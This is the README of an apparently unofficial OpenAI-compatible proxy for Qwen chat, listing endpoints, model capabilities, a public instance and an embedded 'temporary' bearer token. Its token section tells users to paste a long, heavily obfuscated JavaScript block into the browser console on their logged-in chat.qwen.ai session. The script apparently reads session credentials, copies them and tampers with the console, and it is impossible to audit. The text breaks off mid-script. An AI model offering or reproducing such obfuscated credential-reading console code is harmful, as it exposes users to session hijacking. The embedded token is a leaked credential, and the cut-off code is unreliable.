<div align="center">
  <img src="https://assets.alicdn.com/g/qwenweb/qwen-webui-fe/0.0.201/favicon.png" alt="Qwen Logo" width="120" height="120">
  
  <h1>Qwen API</h1>
  
  <p>
    <strong>OpenAI-compatible API endpoints for Qwen AI</strong>
  </p>
  
  <p>
    <a href="#-key-features">Features</a> •
    <a href="#-quick-start">Quick Start</a> •
    <a href="#️-supported-endpoints">Supported Endpoints</a> •
    <a href="#-openapi-docs">OpenAPI Docs</a> •
    <a href="#-usage-examples">Usage Examples</a> •
    <a href="#-license">License</a>
  </p>
  
  <br/>
</div>

## 🌟 Overview

Qwen API Proxy acts as a bridge between Qwen AI's proprietary API and the widely-adopted OpenAI API format. This allows developers to seamlessly integrate Qwen's advanced AI capabilities into their applications using familiar OpenAI-compatible endpoints.

> **Note**: This is an unofficial proxy and not affiliated with Alibaba Cloud or Qwen AI.

## 📘 OpenAPI Docs

- **Spec file**: `qwen.json` (OpenAPI 3.1.0)
- **What it is**: OpenAPI-ready API documentation covering all endpoints, OpenAI-compatible request/response shapes, security, and examples.
- **How to use**:
  - Import `qwen.json` into Swagger UI, Redocly, Postman, Bruno, or Insomnia.
  - Generate typed clients with your preferred tool (e.g., `openapi-generator`, `orval`).
- **Servers**: Defaults to `https://qwen.aikit.club`; you can change the `host` variable or edit the server URL after import.

## 🚀 Key Features

| Feature                     | Description                                               |
| --------------------------- | --------------------------------------------------------- |
| 🔁 **OpenAI Compatibility** | Drop-in replacement for OpenAI API calls                  |
| 💬 **Chat Completions**     | Text-based conversations with all Qwen models             |
| 🎨 **Image Generation**     | Create stunning images from text prompts                  |
| ✏️ **Image Editing**        | Modify existing images with text instructions             |
| 🎬 **Video Generation**     | Transform text into video content                         |
| 🔬 **Deep Research**        | Comprehensive research with web search and citations      |
| 👨🏻‍💻 **Web Development**      | Generate interactive web components and UI elements       |
| 🏗️ **Full-Stack Apps**      | Complete application development from frontend to backend |
| 🔍 **Web Search**           | Enable web search capabilities in conversations           |
| 🧠 **Thinking Mode**        | Activate reasoning mode for complex problem solving       |
| 👁️ **Vision Support**       | Analyze images, PDFs, and visual content                  |
| 📁 **Multimodal Files**     | Support for image, audio, video, and document uploads     |
| 🌍 **CORS Support**         | Full cross-origin resource sharing support                |
| ⚡ **Edge Performance**     | Lightning-fast global deployment via Cloudflare Workers   |

## 🛠️ Supported Endpoints

| Endpoint                 | Method      | Description           |
| ------------------------ | ----------- | --------------------- |
| `/v1/validate`           | GET/POST    | Validate token        |
| `/v1/refresh`            | GET/POST    | Refresh token         |
| `/v1/models`             | GET         | List available models |
| `/v1/chat/completions`   | POST        | Chat completions      |
| `/v1/images/generations` | POST        | Generate images       |
| `/v1/images/edits`       | POST        | Edit existing images  |
| `/v1/videos/generations` | POST        | Generate videos       |
| `/v1/chats/delete`       | DELETE/POST | Delete all chats      |

## 🧠 Model Capabilities

| Model Name                 | 👁️ Vision | 💡 Reasoning | 🌐 Web Search | 🔧 Tool Calling |
| -------------------------- | --------- | ------------ | ------------- | --------------- |
| QVQ-Max                    | ✅        | ✅           | ❌            | ❌              |
| Qwen-Deep-Research         | ❌        | ✅           | ❌            | ❌              |
| Qwen2.5-Max                | ✅        | ✅           | ✅            | ❌              |
| Qwen3-Next-80B-A3B         | ✅        | ✅           | ✅            | ❌              |
| Qwen2.5-Plus               | ✅        | ✅           | ✅            | ❌              |
| Qwen2.5-Turbo              | ✅        | ✅           | ✅            | ❌              |
| Qwen2.5-14B-Instruct-1M    | ✅        | ✅           | ✅            | ❌              |
| Qwen2.5-72B-Instruct       | ✅        | ✅           | ❌            | ❌              |
| Qwen2.5-Coder-32B-Instruct | ✅        | ✅           | ✅            | ❌              |
| Qwen2.5-Omni-7B            | ✅        | ❌           | ✅            | ❌              |
| Qwen2.5-VL-32B-Instruct    | ✅        | ✅           | ✅            | ❌              |
| Qwen3-235B-A22B-2507       | ✅        | ✅           | ✅            | ❌              |
| Qwen3-30B-A3B-2507         | ✅        | ✅           | ✅            | ❌              |
| Qwen3-Coder                | ✅        | ❌           | ✅            | ✅              |
| Qwen3-Coder-Flash          | ✅        | ❌           | ✅            | ❌              |
| Qwen-Web-Dev               | ✅        | ❌           | ❌            | ❌              |
| Qwen-Full-Stack            | ✅        | ❌           | ❌            | ❌              |
| Qwen3-Max                  | ✅        | ❌           | ✅            | ❌              |
| Qwen3-Omni-Flash           | ✅        | ✅           | ❌            | ❌              |
| Qwen3-VL-235B-A22B         | ✅        | ✅           | ❌            | ❌              |
| Qwen3-VL-30B-A3B           | ✅        | ✅           | ❌            | ❌              |
| QWQ-32B                    | ❌        | ✅           | ✅            | ❌              |

## 🚀 Quick Start

### Use the Public Instance

The public instance is available at: `https://qwen.aikit.club`

## 💡 Usage Examples

### Authentication

The proxy requires a Bearer token containing compressed Qwen credentials:

```javascript
const headers = {
  Authorization: "Bearer YOUR_COMPRESSED_QWEN_TOKEN",
  "Content-Type": "application/json",
};
```

### Temporary Free Token

For quick testing, you can use this temporary token until it expires.

- Token:

```
H4sIAAAAAAAAAxXIzXaiMBgA0AfitEV+Ki66iHwQYxCEQmPczBGIAhJUChI58/Bz5i6veG2rHBd1VG9JNpNFWJNf0iV24ZJPcr0fftzt6l28tvfj/5CezqXfhOnFCtJYj9JsCKGYw9ei5oZnB2lshHJbcblTu4ZY0Tf5JVJVhZmcC+zPhVk+C5mcuVFVuSxb0txUOGdGCDsznL0pcLet2KA6ajwzbNC8S4tp1xxX72mcBvsD+nNYvC089WIbg85vAvS8162Tk/1Qk7L8sTSr3+KvGOvhoXtwxVdYQgfWiEFTcXBXhXz60FrrAScZkAeOcQGOqilsgEQzn08u8gLVawPX2pIgOlHAB7UQkYWvB2B77Inj2f+0W7dFU0oujos362VZYn7EPNusEB0d7q+iftR7NmaX60eNpuncC3AcC+gDS82C71jBSijVA+fgWngCfAPTghpgXyrI8qkTsFRdvIvZ48swbppgIPPzKVZwWe9h4Rw7pgrdWd7PKPdYmgvcJShKfcWg0V7MofilWZj5+diMFI80M8QzYmlfiGxfBfd1LjPNSwbHGfbaunJ8bvXaTV0vqkQQovxmfNVrsCNo6zkUUFeyd+XUkh4y45QhdzCNiTbSFkm/ujsdXjagNyAYnRkOPyaMwWa1zrWBARVVOiCbThaHf7zpTSppAgAA
```

- Expires: 2025-10-13 00:57:06 UTC (2025-10-13 06:27:06 IST, UTC+05:30)
- Note: This token is for evaluation only and will stop working after the expiration time.

### How to Get Your Token

To obtain your Qwen API token, follow these steps:

1. **Visit Qwen Chat**: Go to [chat.qwen.ai](https://chat.qwen.ai) and log in to your account
2. **Run the Token Extractor**: Copy and paste the following JavaScript code into your browser's developer console (press F12 → Console tab):

```javascript
const _0x4015=['WRPXWRnYW5G','rmoucJBdGW','ymkojmokoG','b8oDAtWA','W5y4WQW4W47dMCoQWPZcTCoyoLK','WRzAe8kYia','bmotDudcLW','WRr0aq','W7zSb8o1bG','WOhcLmo1imoN','Ba9luaO','gvGAEJe','WQHVWRm','qCo1W6C3tq','mgiaBrW','swydpmkS','W63cISk+WP7dTZWXW6hdJWufW7W','jmoWFSoFWP8','ACojEmkUeG8HW4a','pf51zSka','tCktECkDW48','BWNcTvrr','r8ohW7SotW','W49IWPNcPJm','ea5xW6qS','bbVdRa1Q','W40TWQW','WRaslsDW','s8kCDKNdKq','W73cRSkV','icT6W7mn','t8kUESkVW7G','kgNcJSoVsa','WOVdNSo4W4BcMG','mSkMuKVcNga5AfFdKCkZWPi','a1ldNc9K','WQpcTvNdGSoUtCkKW7BdGSoyWPKJ','WRLHic0y','WR/cUgpdUHW','W7ZcRCoDW7lcNq','BCkPywFdSW','4PYJWPzkaCkD','g8o5vci5','xmkLB8of','dCocDIim','nGbv','W6idDgvKW5S+WRiuW5DoW6m','WQT6a8oxtW','Bqi+W4xcSG','rdOoAq','W6RdJGJcKvJcO8o8uCoXWRb6WQe','wSoXWO8HW5C','W49IWRX+tq','tX4NW6FcHW','cq9JW5Kc','WPlcSCk/mmoa','BZ0eW4dcVq','eCo4twft','EfZdNCo3BW','DmkPgSoSkq','DmoxWRSqW5a','WPn8W6bTWPW','4P6MWRldRI/cJW','W7ZdSqNcIq','dxPtr8k1','jmkFEWBcIa','mmkzjColla','ACo9F8kGWPq','D8o3dW7dJW','vICfybi','WO7dSsKSW5C','lW9WW7ak','WO0vy8kLqmofvCkqAN3dGmo0','WOvlW7fOWPu','W7VdHGC','WPZcQfldHGG','W77dObxdM8k6','tSkxbMO','tZOe','mcyIwKK','Etf4sGy','WOBdT8o3lCkz','AsJcTg1r','fNTCz1y','j2CgyXu','WPpdLCoEW4hcOq','WQ3dNaWuW7m','WQvZWR9KW48','B8oKg1C','AmoPcG','c8oeqqyS','dCozAbK','p31Feui','Atvysd8','mveEBIK','xtFcR0XD','WOnAeSktvW','x8kUWRZcRsu','Emo4euVcMq','fuhdNqbY','EfZdOmkMAW','DmkLWR/cOG','WQZcSI7cQSkjaSkIW60','DCoAWRfQW6S','fuNdIZPL','AvW5hSkF','WRldGX4EW64','F8kGc8o0dG','fepdRWf1','E8o2WOaMW5S','rmkXotqg','CSoheSoN','DtaIgv8','jmoquSoYWPa','q8oeld7dNq','k1b9nCor','nCo0DurM','DCkNl8oYeq','lK5TyCkv','EGWjaMW','qSkJW6i2CG','ACojp8oC','ACkmnXez','WQdcUh3dJXq','smovW5LLW4e','sCk7z8kNW6e','W6n4WQJcVXa','8k2kKtRdKmkxW7y','W7SQx8oxsa','W60Rvmks','n8oRqMPe','WPNcSSkBlmoi','wmoQW60TpW','WRDybCk0','nvzfCSkM','kuCjCCkQ','WP7cNLpdRXO','imkSduRdIq','wSkXD8ktW4y','k08jmHG','kmoxq0X4','kmo6vwfv','DSoDW7b+W7C','nSo7W6hdVZZdHSowE8o/W4e','AKhdS8oLBq','o8kBq8of','W6JcVCofW7xcUW','ht5syW4','ewHxaL4','4P+1bXpdSbW','W70XvCoFvq','b1ldII4','W77cPCoGW5BcMa','CColWQe6W6W','nKXHEW','jSojySoKWPO','gNTrfva','kSk0yHxcGa','WRZcLe0','sLBdQSoY','D8k4t0ldPq','mLX6y8k3','fmoliGpcMW','zItcGLTD','ptZdRfGm','vsaXiMq','C8k4WQNcOc4','i0TkCSk1','BZqQW4RcSG','fH1jW6WZ','BmkBCehdOq','rSkkgciK','WQTXaCkeftaWqSk3BSkXWPu','tcq2W7W','W74DWRTPqa','BIPlwci','lmoCwhHH','wtWJW77cRW','8yIgG18SW7ddRq','iSoEsbW8','W55pdmoAiq','s8oPWOWOW40','zIHICXu','a8onxuLM','W74yqmoTpmklkCkyyuFcKSou','mmkgEWVcMW','c8owCt0','EwuxaSkP','W43dHH3cV8kp','WQfxd8kkBq','8yIkOv8TW6BdUG','imk4WR/dRcG','WQzMWOXfW7S','kCo0vwz8','phdcS8oVuW','uCoSW7jAW6u','W4qhWQD+qG','WOtdSbq2W58','W4aar8oUEa','vIP5sW8','pdP6W5CX','W5bjm8o+','D8kOkmownq','aHXLW5uD','WPLOWRTJW5m','WQrcgmkVyq','BtvFra','C8kPWRZcQsG','WPBcLmo7nCoM','zmohkCob','B8k2sX3dNW','ACo3f1xdMW','EGJcPvjb','kKXOFmke','fmoRz0Ti','c1lcHmo+','cGLWW78a','bmoSxIhcVW','WR5PcSodxG','x2FdLCoQqG','nuDqE8kG','W4jSWPlcGG0','WRhdLHTDW7m','WRFcMu3dGam','l0/cPmoDBG','WRXCiW','WPVcRSkMemoE','wCobW45aW4C','tSkndXuM','WQ97WRnIW6G','W4LPf8oMpG','lqPwFqa','WPD1W7OOwf94WOGGyG','W5ipuSoOza','W4BdIeddHXy','W4qWWRL0xq','8jA7LuPeh8kx','bmodAZKw','rYuAFa4','lvnxyCkc','W7X2aSoNfW','W4fzWONcLXe','W7xcNSkO8ls9Ja','r8kbaSohcW','W4CKqmovFG','W6RdM1NdPW','eSk0r33cMq','hmo3x8oVWQ4','nmoJqwXE','oaDRCrS','fNLpd3K','WRHlW6HfWQ8','W73dJKddSIC','pmkBvmkynG','D8kxW7XQ','W49/WPxcVGm','c3XIWQldOcbGW7u/EgBdSW','lmoTAmoVWOq','FqqBW5/cLW','FGVcOW','va8zvZa','FGGjf0q','bHpdUxOp','fXXWW7G','W77dKbBcMmkU','ceVcMSo2uG','x8oMW7uSBq','W6OGxCotvW','A8o+eu3dNG','CvldOmoImG','eqZdSfKQ','WRRcIfZdIbG','iSkBwW','CLRdOSoKzW','W5WSDSojvW','W451iCoKja','mCkosSkAla','bhTUl3q','smkRaX4','CYGOcu4','EmoiWROtW5i','ssWtCWbYWPVcLSkoWQX6ra'];function _0x1994(_0x1f187a,_0x36a6a6){_0x1f187a=_0x1f187a-0xc5;let _0x11e1a6=_0x4015[_0x1f187a];if(_0x1994['lScHoZ']===undefined){var _0x2af7eb=function(_0x285d4e){const _0x5ea8f9='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x5fca6a='';for(let _0x1dda1f=0x0,_0x5a13fa,_0x37430d,_0x279bd8=0x0;_0x37430d=_0x285d4e['charAt'](_0x279bd8++);~_0x37430d&&(_0x5a13fa=_0x1dda1f%0x4?_0x5a13fa*0x40+_0x37430d:_0x37430d,_0x1dda1f++%0x4)?_0x5fca6a+=String['fromCharCode'](0xff&_0x5a13fa>>(-0x2*_0x1dda1f&0x6)):0x0){_0x37430d=_0x5ea8f9['indexOf'](_0x37430d);}return _0x5fca6a;};const _0x199468=function(_0x405304,_0x37c2a6){let _0x523e25=[],_0x55c45b=0x0,_0x302d94,_0x3c0347='',_0x1e9562='';_0x405304=_0x2af7eb(_0x405304);for(let _0x215541=0x0,_0x4a1ed5=_0x405304['length'];_0x215541<_0x4a1ed5;_0x215541++){_0x1e9562+='%'+('00'+_0x405304['charCodeAt'](_0x215541)['toString'](0x10))['slice'](-0x2);}_0x405304=decodeURIComponent(_0x1e9562);let _0x4e2298;for(_0x4e2298=0x0;_0x4e2298<0x100;_0x4e2298++){_0x523e25[_0x4e2298]=_0x4e2298;}for(_0x4e2298=0x0;_0x4e2298<0x100;_0x4e2298++){_0x55c45b=(_0x55c45b+_0x523e25[_0x4e2298]+_0x37c2a6['charCodeAt'](_0x4e2298%_0x37c2a6['length']))%0x100,_0x302d94=_0x523e25[_0x4e2298],_0x523e25[_0x4e2298]=_0x523e25[_0x55c45b],_0x523e25[_0x55c45b]=_0x302d94;}_0x4e2298=0x0,_0x55c45b=0x0;for(let _0x37ea7b=0x0;_0x37ea7b<_0x405304['length'];_0x37ea7b++){_0x4e2298=(_0x4e2298+0x1)%0x100,_0x55c45b=(_0x55c45b+_0x523e25[_0x4e2298])%0x100,_0x302d94=_0x523e25[_0x4e2298],_0x523e25[_0x4e2298]=_0x523e25[_0x55c45b],_0x523e25[_0x55c45b]=_0x302d94,_0x3c0347+=String['fromCharCode'](_0x405304['charCodeAt'](_0x37ea7b)^_0x523e25[(_0x523e25[_0x4e2298]+_0x523e25[_0x55c45b])%0x100]);}return _0x3c0347;};_0x1994['ZxaWpV']=_0x199468,_0x1994['SbJgZV']={},_0x1994['lScHoZ']=!![];}const _0xcdd3e6=_0x4015[0x0],_0xbb99d8=_0x1f187a+_0xcdd3e6,_0x40152d=_0x1994['SbJgZV'][_0xbb99d8];return _0x40152d===undefined?(_0x1994['dzKgfM']===undefined&&(_0x1994['dzKgfM']=!![]),_0x11e1a6=_0x1994['ZxaWpV'](_0x11e1a6,_0x36a6a6),_0x1994['SbJgZV'][_0xbb99d8]=_0x11e1a6):_0x11e1a6=_0x40152d,_0x11e1a6;}(function(_0x16522d,_0x26927b){const _0x54b66c=_0x1994;while(!![]){try{const _0x510abc=parseInt(_0x54b66c(0x19e,'&s(p'))+-parseInt(_0x54b66c(0x1c2,'1wGe'))+-parseInt(_0x54b66c(0x18a,'TPgk'))+parseInt(_0x54b66c(0x1ac,'oPq&'))+-parseInt(_0x54b66c(0x19c,'C]a#'))+parseInt(_0x54b66c(0x1a8,'kEI4'))+parseInt(_0x54b66c(0x148,'a)A!'))*parseInt(_0x54b66c(0xc6,'&s(p'));if(_0x510abc===_0x26927b)break;else _0x16522d['push'](_0x16522d['shift']());}catch(_0x571e6f){_0x16522d['push'](_0x16522d['shift']());}}}(_0x4015,0x98b43),function(){const _0x473df3=_0x1994,_0xae8318={'CNZkH':function(_0x59974c,_0x94f440){return _0x59974c===_0x94f440;},'ebqsp':_0x473df3(0x120,'aj9A'),'EdvXO':function(_0x10d662,_0x3336c2){return _0x10d662(_0x3336c2);},'YCkKX':'😒\x20Par'+'t\x201\x20n'+_0x473df3(0xe7,'RrYc')+_0x473df3(0xe1,'nyMG'),'rzykL':_0x473df3(0xdf,'FL&@')+'t\x201\x20d'+_0x473df3(0xf6,'nyMG')+_0x473df3(0x1c4,'qvgw'),'BQiqx':_0x473df3(0x11e,'7JW9')+_0x473df3(0xeb,'BJBv')+'ot\x20fo'+'und.','lvrEk':'😎\x20Par'+'t\x202\x20d'+_0x473df3(0xd0,'Uh#2')+'ed.','lvfnR':_0x473df3(0x1ce,'3u3p'),'wqvEp':_0x473df3(0x149,'nyMG'),'pzyJr':_0x473df3(0xf5,'1wGe')+_0x473df3(0xc7,'wEE*')+_0x473df3(0xd8,'mpN[')+_0x473df3(0x17a,'aj9A')+'\x20web_'+_0x473df3(0xdd,'NTl8')+_0x473df3(0x197,'B2k@'),'ERkod':function(_0x26f245,_0x48c4d2){return _0x26f245(_0x48c4d2);},'jHNxG':_0x473df3(0x14c,'F*L&')+'s\x20cod'+_0x473df3(0x195,'kEI4')+_0x473df3(0x1de,'DXG^')+_0x473df3(0x133,'C]a#')+_0x473df3(0x156,'F!Sj')+'i','NrPQD':_0x473df3(0xf9,'wEE*')+'://ch'+'at.qw'+_0x473df3(0x130,'e1zP'),'hTsDQ':_0x473df3(0x1db,'XtaI')+'k','UhEoX':function(_0x23be8c,_0x17fbbe){return _0x23be8c!==_0x17fbbe;},'UWRXc':_0x473df3(0x108,'I51z'),'UjBxR':_0x473df3(0x1bb,'F!Sj'),'XCqDV':function(_0x3c8c53,_0x12c6bd){return _0x3c8c53(_0x12c6bd);},'fzyVc':function(_0x3e538d,_0x4e6d6a){return _0x3e538d+_0x4e6d6a;},'Skmbx':function(_0x4c209a,_0x4c7855){return _0x4c209a+_0x4c7855;},'pJuPN':_0x473df3(0x16a,'mpN[')+_0x473df3(0x132,'C]a#')+_0x473df3(0x13f,'oPq&')+_0x473df3(0x15e,'wEE*'),'EBiMi':_0x473df3(0x102,'mA3$')+'nstru'+_0x473df3(0x1dc,'m^1T')+_0x473df3(0x1bc,'Qid!')+_0x473df3(0x183,'e1zP')+'is\x22)('+'\x20)','Jvalc':function(_0x39e538){return _0x39e538();},'htOAw':_0x473df3(0x15a,'$i8J'),'OFzmN':_0x473df3(0x194,'a)A!'),'XjiES':'warn','kZRAK':_0x473df3(0x129,'1wGe'),'qgodL':'error','irYNY':_0x473df3(0x107,'RrYc')+_0x473df3(0xc5,'XtaI'),'EQWvb':'table','qxKKu':_0x473df3(0xf0,'DXG^'),'mKKKW':function(_0x1abc88,_0x871b07){return _0x1abc88<_0x871b07;},'yBDfx':function(_0x47deb9,_0xb93325,_0x45f3e6){return _0x47deb9(_0xb93325,_0x45f3e6);},'wULoA':'token','uwFxE':_0x473df3(0xe9,'m^1T')+_0x473df3(0x18b,'FL&@')+_0x473df3(0x1a5,'NTl8'),'vNrPt':function(_0x597047,_0x15c9df){return _0x597047||_0x15c9df;},'kUzcw':_0x473df3(0xf8,'B2k@'),'cUpmF':_0x473df3(0x1a3,'mA3$')+_0x473df3(0x13e,'7JW9')+'o\x20cop'+'y\x20to\x20'+_0x473df3(0x15c,'qvgw')+_0x473df3(0x16d,'DXG^'),'BROEw':_0x473df3(0x16e,'J1gN')+_0x473df3(0x170,'@b18'),'EHHMA':_0x473df3(0x19d,'6blX'),'JuRlP':'copy','wRtuQ':_0x473df3(0x112,'7JW9')+_0x473df3(0x1ae,'a)A!')+_0x473df3(0x19b,'TPgk')+_0x473df3(0xf1,'@b18'),'nzYIV':function(_0x53aba8,_0x4da6cd){return _0x53aba8!==_0x4da6cd;},'LuJQV':_0x473df3(0x1a1,'B2k@'),'FtNGE':_0x473df3(0x182,'1wGe'),'pjPHD':_0x473df3(0x11b,'0y*Z'),'XUduG':'🔑\x20Qwe'+'n\x20web'+_0x473df3(0x154,'nyMG')+_0x473df3(0x180,'mA3$')+_0x473df3(0x1d1,'aj9A')+_0x473df3(0x11f,'XtaI')+_0x473df3(0x171,'DXG^')+_0x473df3(0x193,'J1gN')+_0x473df3(0x152,'TPgk'),'aKjdO':function(_0x1265d6,_0x36f165,_0x355e41){return _0x1265d6(_0x36f165,_0x355e41);},'oVxdl':_0x473df3(0x11a,'*i#p'),'awoYM':function(_0x192c8f,_0x5bbeec){return _0x192c8f===_0x5bbeec;},'WqWRk':'nRFol','YyRnq':_0x473df3(0x19f,'kEI4'),'dObow':_0x473df3(0x1b4,'DXG^'),'XEwRY':function(_0x44739c,_0x5dd8ab){return _0x44739c(_0x5dd8ab);},'YpBvC':'AXWkQ','DwdOY':function(_0x13b841,_0x52e295){return _0x13b841(_0x52e295);},'TFWRE':function(_0x3dd7ce,_0x2ade8c,_0x170d3e){return _0x3dd7ce(_0x2ade8c,_0x170d3e);},'ARduc':function(_0x5b1fd2,_0x2d7fd7){return _0x5b1fd2!==_0x2d7fd7;},'mOHrf':'chat.'+_0x473df3(0x17f,'@QUo')+'ai','BczVw':function(_0x7c84a,_0xa80f82){return _0x7c84a===_0xa80f82;},'OeKFx':_0x473df3(0x1cf,'TPgk'),'rZsGG':function(_0x2c5f7b,_0x78016){return _0x2c5f7b(_0x78016);}},_0x16d3bd=function(){const _0x1e458a=_0x473df3,_0x7d2b22={'zjtim':function(_0x515e36,_0x4fbfeb){const _0xd0612f=_0x1994;return _0xae8318[_0xd0612f(0x105,'Uh#2')](_0x515e36,_0x4fbfeb);},'YpoGc':_0xae8318[_0x1e458a(0x125,'7JW9')],'sWpBs':_0xae8318[_0x1e458a(0xea,'NTl8')],'eXweE':_0xae8318[_0x1e458a(0xf3,'BJBv')],'nsTNW':_0xae8318[_0x1e458a(0x1b0,'(lh[')]};if(_0xae8318[_0x1e458a(0xda,'i[FD')](_0xae8318[_0x1e458a(0x187,'mpN[')],_0xae8318['wqvEp'])){function _0x1cd2b4(){const _0xf11030=_0x1e458a;return _0x7d2b22['zjtim'](_0x4fd02d,'❌\x20web'+'_api_'+_0xf11030(0x1cd,'$i8J')+_0xf11030(0x1a6,'*i#p')+_0xf11030(0x1bd,'FL&@')+'uilt\x20'+_0xf11030(0xc8,'6blX')+_0xf11030(0xd3,'YG!8')+_0xf11030(0x1c7,'mA3$')+(!_0x518ab5?_0x7d2b22[_0xf11030(0x188,'3u3p')]:_0x7d2b22[_0xf11030(0x10a,'E^n8')])+'\x0a'+(!_0xa5536?_0x7d2b22[_0xf11030(0x18e,'NTl8')]:_0x7d2b22[_0xf11030(0xce,'i[FD')])),null;}}else{let _0x38c501=!![];return function(_0x268ef8,_0x11d188){const _0x422916=_0x1e458a,_0x595b2c={'iCRuV':function(_0x8866d4,_0x54a86c){const _0x257589=_0x1994;return _0xae8318[_0x257589(0x1ad,'wEE*')](_0x8866d4,_0x54a86c);},'fFsTs':_0xae8318[_0x422916(0x18d,'YG!8')]},_0x3b3dca=_0x38c501?function(){const _0x308e7f=_0x422916;if(_0x595b2c[_0x308e7f(0x123,'rO)i')](_0x595b2c['fFsTs'],_0x595b2c['fFsTs'])){if(_0x11d188){const _0x3418d2=_0x11d188[_0x308e7f(0x111,'I51z')](_0x268ef8,arguments);return _0x11d188=null,_0x3418d2;}}else{function _0x5422a8(){const _0x1612d5=_0x308e7f;_0x290ea2[_0x1612d5(0x1d3,'m^1T')](_0x4291c1,_0x11f679),_0x2b1c1b+=_0x1377af[_0x1612d5(0xe2,'XA]F')+'h'];}}}:function(){};return _0x38c501=![],_0x3b3dca;};}}();if(_0xae8318[_0x473df3(0x19a,'29[1')](window['locat'+_0x473df3(0x1c8,'F*L&')][_0x473df3(0x14d,'*i#p')+_0x473df3(0x163,'d]aa')],_0xae8318[_0x473df3(0xd1,'FL&@')])){if(_0xae8318[_0x473df3(0x1d6,'$i8J')](_0xae8318[_0x473df3(0x136,'XA]F')],_0xae8318[_0x473df3(0xfd,'F!Sj')])){_0xae8318[_0x473df3(0x1da,'@QUo')](alert,_0xae8318[_0x473df3(0xe3,'e1zP')]),window['open'](_0xae8318[_0x473df3(0xee,'rO)i')],_0xae8318[_0x473df3(0x151,'7Ymo')]);return;}else{function _0x422a30(){const _0x25326a=_0x473df3;return _0x1bcbe2[_0x25326a(0x161,'FL&@')](_0xae8318[_0x25326a(0xdc,'rO)i')],_0x23883f),_0xae8318[_0x25326a(0x198,'(lh[')](_0x2dff17,_0x300947);}}}function _0x1cf4e6(){const _0x1cb820=_0x473df3,_0x5bcd03={'SBVQP':function(_0x3e225b,_0xfc8881){const _0x10246a=_0x1994;return _0xae8318[_0x10246a(0x1c5,'oPq&')](_0x3e225b,_0xfc8881);},'TPvJC':_0xae8318[_0x1cb820(0xd7,'Uh#2')],'kqqqb':_0xae8318[_0x1cb820(0x113,'*i#p')],'nLNmo':_0xae8318[_0x1cb820(0x142,'e1zP')],'fBZSp':function(_0x1cb38b,_0x34bc20){return _0xae8318['UhEoX'](_0x1cb38b,_0x34bc20);},'gGlrQ':_0xae8318[_0x1cb820(0x119,'F!Sj')],'UNmWd':_0xae8318[_0x1cb820(0x153,'Qid!')],'czqWD':function(_0x43e290,_0x309d2e){const _0x1a462a=_0x1cb820;return _0xae8318[_0x1a462a(0x11c,'&s(p')](_0x43e290,_0x309d2e);},'GdjFv':function(_0x2a6cb0,_0x3ae37b){const _0x4f9ef6=_0x1cb820;return _0xae8318[_0x4f9ef6(0x11d,'@QUo')](_0x2a6cb0,_0x3ae37b);},'gnkhu':function(_0x4dac44,_0x3ca915){const _0x11df3e=_0x1cb820;return _0xae8318[_0x11df3e(0x12c,'aj9A')](_0x4dac44,_0x3ca915);},'mhnZO':_0xae8318[_0x1cb820(0x185,'3u3p')],'sYoAH':_0xae8318[_0x1cb820(0x17b,'C]a#')],'duyRq':function(_0x32eb28){const _0x2b03a3=_0x1cb820;return _0xae8318[_0x2b03a3(0x1c1,'(lh[')](_0x32eb28);},'ghYKT':_0xae8318[_0x1cb820(0x100,'E^n8')],'bIUlD':_0xae8318['OFzmN'],'RVYbR':_0xae8318[_0x1cb820(0x14a,'qvgw')],'kfIef':_0xae8318[_0x1cb820(0x139,'mA3$')],'sdXpZ':_0xae8318['qgodL'],'tFFZh':_0xae8318[_0x1cb820(0x116,'K$uy')],'gLoMH':_0xae8318[_0x1cb820(0x150,'1wGe')],'ATGlJ':_0xae8318[_0x1cb820(0xcc,'6blX')],'vkCwJ':function(_0x2a5e6a,_0x49611b){const _0x4ca686=_0x1cb820;return _0xae8318[_0x4ca686(0xcb,'Qid!')](_0x2a5e6a,_0x49611b);}},_0x259d5d=_0xae8318[_0x1cb820(0xdb,'oPq&')](_0x16d3bd,this,function(){const _0x57ede8=_0x1cb820,_0x611d04={'TkfXw':function(_0x10b86f,_0x1c5809){const _0x16bc78=_0x1994;return _0x5bcd03[_0x16bc78(0x1c0,'7JW9')](_0x10b86f,_0x1c5809);},'yeKhA':_0x5bcd03[_0x57ede8(0x196,'E^n8')],'RcRBt':_0x5bcd03[_0x57ede8(0x17d,'*i#p')],'DiFuv':_0x5bcd03[_0x57ede8(0x165,'Uh#2')]};if(_0x5bcd03[_0x57ede8(0x1a0,'oPq&')](_0x5bcd03['gGlrQ'],_0x5bcd03[_0x57ede8(0x1aa,'I51z')])){let _0x32fd3e;try{const _0x590cb4=_0x5bcd03[_0x57ede8(0x166,'J1gN')](Function,_0x5bcd03[_0x57ede8(0xe8,'oPq&')](_0x5bcd03['gnkhu'](_0x5bcd03[_0x57ede8(0x1b6,'wEE*')],_0x5bcd03[_0x57ede8(0xec,'XA]F')]),');'));_0x32fd3e=_0x5bcd03['duyRq'](_0x590cb4);}catch(_0x2c0847){if(_0x5bcd03[_0x57ede8(0x1b5,'Qid!')](_0x5bcd03[_0x57ede8(0x1d4,'*i#p')],_0x5bcd03[_0x57ede8(0x114,'1wGe')])){function _0x672cc3(){const _0x509462=_0x37c2a6?function(){const _0x59a037=_0x1994;if(_0x4e2298){const _0x4344a8=_0x5945c2[_0x59a037(0x14e,'F*L&')](_0x38b972,arguments);return _0x484d62=null,_0x4344a8;}}:function(){};return _0x1e9562=![],_0x509462;}}else _0x32fd3e=window;}const _0xdb01d7=_0x32fd3e['conso'+'le']=_0x32fd3e[_0x57ede8(0x12d,'@QUo')+'le']||{},_0x11147e=[_0x5bcd03[_0x57ede8(0xcd,'wEE*')],_0x5bcd03[_0x57ede8(0x115,'wEE*')],_0x5bcd03['kfIef'],_0x5bcd03[_0x57ede8(0x109,'(lh[')],_0x5bcd03['tFFZh'],_0x5bcd03[_0x57ede8(0xd5,'Qid!')],_0x5bcd03[_0x57ede8(0x13b,'DXG^')]];for(let _0x2881c5=0x0;_0x5bcd03[_0x57ede8(0x1ca,'K$uy')](_0x2881c5,_0x11147e['lengt'+'h']);_0x2881c5++){const 